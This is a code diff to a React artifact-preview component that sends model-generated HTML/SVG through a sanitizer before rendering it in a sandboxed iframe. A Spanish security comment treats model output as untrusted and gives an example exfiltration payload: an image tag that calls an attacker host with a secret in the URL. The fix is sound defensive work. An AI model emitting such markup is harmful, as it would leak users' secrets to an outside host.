@@ -1,6 +1,7 @@
 import { useState, useMemo, memo } from "react";
 import { Code, FileText, Globe, Image as ImageIcon, Copy, Check, ArrowSquareOut, Eye } from "@phosphor-icons/react";
 import { getSharedCanvasBridge } from "../../lib/canvasBridgeSingleton.js";
+import { sanitizeArtifactHtml } from "../../lib/sanitize-html.js";
 
 export type ArtifactKind = "code" | "markdown" | "html" | "svg" | "diagram";
 
@@ -60,6 +61,16 @@ export const ArtifactCard = memo(function ArtifactCard({
 
   const isHtmlOrSvg = langLower === "html" || langLower === "svg" || kind === "html" || kind === "svg";
   const isMermaid = langLower === "mermaid" || kind === "diagram";
+
+  // T3 (EGO-FIND-61): el artifact HTML/SVG lo genera el MODELO (entrada no
+  // confiable). Antes de meterse en el `srcDoc` del iframe pasa por el
+  // sanitizador: sin `<script>`, sin handlers inline y **sin recursos
+  // remotos** (un `<img src="https://attacker…?x=<secreto>">` sería una
+  // exfiltración). La CSP `img-src 'self' data: blob:` es la segunda capa.
+  const sanitizedPreview = useMemo(
+    () => (isHtmlOrSvg ? sanitizeArtifactHtml(trimmed) : trimmed),
+    [trimmed, isHtmlOrSvg]
+  );
 
   const handleCopy = (e: React.MouseEvent) => {
     e.stopPropagation();
@@ -248,7 +259,7 @@ export const ArtifactCard = memo(function ArtifactCard({
             <div className="rounded-lg overflow-hidden border border-hairline bg-white shadow-inner">
               <iframe
                 sandbox=""
-                srcDoc={trimmed}
+                srcDoc={sanitizedPreview}
                 title={displayTitle}
                 className="w-full h-44 border-0 block"
               />
